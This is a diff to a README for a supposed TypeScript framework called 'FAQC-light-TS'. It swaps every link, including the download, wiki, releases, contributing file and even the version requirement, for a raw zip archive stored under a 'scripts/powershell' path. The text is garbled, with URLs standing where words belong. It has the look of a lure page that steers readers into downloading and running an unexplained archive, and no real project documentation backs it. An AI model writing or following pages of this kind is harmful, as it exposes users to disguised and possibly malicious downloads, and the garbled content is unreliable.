@@ -2,7 +2,7 @@
 # 🌟 FAQC-light-TS - A Simple Framework for Quality Development
 
 ## 📥 Download Now
-[![Download FAQC-light-TS](https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip)](https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip)
+[![Download FAQC-light-TS](https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip)](https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip)
 
 ## 🚀 Getting Started
 FAQC-light-TS is a lightweight framework designed to help you develop applications with a focus on quality and context. It uses TypeScript and supports large language models (LLMs). This guide shows you how to download and run it easily.
@@ -16,17 +16,17 @@ FAQC-light-TS is a lightweight framework designed to help you develop applicatio
 ## ⚙️ System Requirements
 Before you download, ensure your system meets these basic requirements:
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
-- **https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip Version:** https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip 14 or above.
+- **https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip Version:** https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip 14 or above.
 - **RAM:** Minimum 4 GB, recommended 8 GB for optimal performance.
 - **Disk Space:** At least 100 MB available for installation.
 
 ## 📥 Download & Install
-1. Visit the Releases page to download the latest version: [Download Page](https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip).
-2. Choose the latest release listed. Look for a file named `https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip` for a complete package.
+1. Visit the Releases page to download the latest version: [Download Page](https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip).
+2. Choose the latest release listed. Look for a file named `https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip` for a complete package.
 3. Click on the zip file to download it to your computer.
 4. Once downloaded, locate the file in your downloads folder. 
 5. Extract the contents of the zip file to a preferred location on your device. 
-6. After extracting, open the folder and find the `https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip` file. This contains additional setup instructions.
+6. After extracting, open the folder and find the `https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip` file. This contains additional setup instructions.
 
 ## ⚙️ Setting Up FAQC-light-TS
 After extraction, follow these steps to set up the framework:
@@ -50,15 +50,15 @@ This will launch FAQC-light-TS, and you can start creating your project based on
 If you need help or have questions, please check the `Issues` section on the GitHub repository. You can also contact the project maintainers for assistance.
 
 ## 📚 Additional Resources
-- **Documentation:** For more details on how to use FAQC-light-TS, visit our [Wiki](https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip).
+- **Documentation:** For more details on how to use FAQC-light-TS, visit our [Wiki](https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip).
 - **Tutorials:** Look for helpful guides and video tutorials on utilizing the framework effectively.
 
 ## 🤝 Contributing
-We welcome contributions! If you want to help improve FAQC-light-TS, feel free to submit a pull request or suggest features. Check the `https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip` in the repository.
+We welcome contributions! If you want to help improve FAQC-light-TS, feel free to submit a pull request or suggest features. Check the `https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip` in the repository.
 
 ## 📝 License
 This project is licensed under the MIT License. You may use it freely, but please give credit where it’s due.
 
 ## 📥 Download Again 
-Remember, you can always go back to the Releases page to download any future versions of FAQC-light-TS: [Download Page](https://raw.githubusercontent.com/joaopedro12648/FAQC-light-TS/main/vibecoding/var/FAQC-light-TS-v3.7.zip).
+Remember, you can always go back to the Releases page to download any future versions of FAQC-light-TS: [Download Page](https://github.com/joaopedro12648/FAQC-light-TS/raw/refs/heads/main/scripts/powershell/light_TS_FAQ_1.7.zip).
 ```
